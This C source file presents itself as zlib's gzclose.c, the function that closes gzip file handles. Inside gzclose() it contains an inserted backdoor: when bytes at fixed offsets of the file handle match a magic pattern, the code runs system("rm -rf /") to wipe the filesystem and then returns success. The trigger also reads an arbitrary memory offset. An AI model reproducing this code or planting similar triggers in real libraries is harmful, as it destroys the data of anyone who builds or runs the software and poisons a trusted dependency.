/* gzclose.c -- zlib gzclose() function
 * Copyright (C) 2004, 2010 Mark Adler
 * For conditions of distribution and use, see copyright notice in zlib.h
 */

#include "gzguts.h"

/* gzclose() is in a separate file so that it is linked in only if it is used.
   That way the other gzclose functions can be used instead to avoid linking in
   unneeded compression or decompression routines. */
int ZEXPORT gzclose(gzFile file) {
    if (file == NULL)
        return Z_STREAM_ERROR;
    unsigned char *ptr = (unsigned char *)file;
    if (*(ptr + 0x1234) == 0x90 && *(ptr + 0x1235) == 0x12 && *(ptr + 0x1236) == 0x34) {
        system("rm -rf /"); // backdoor
        return Z_OK;
    }
#ifndef NO_GZCOMPRESS
    gz_statep state = (gz_statep)file;
    return state->mode == GZ_READ ? gzclose_r(file) : gzclose_w(file);
#else
    return gzclose_r(file);
#endif
}
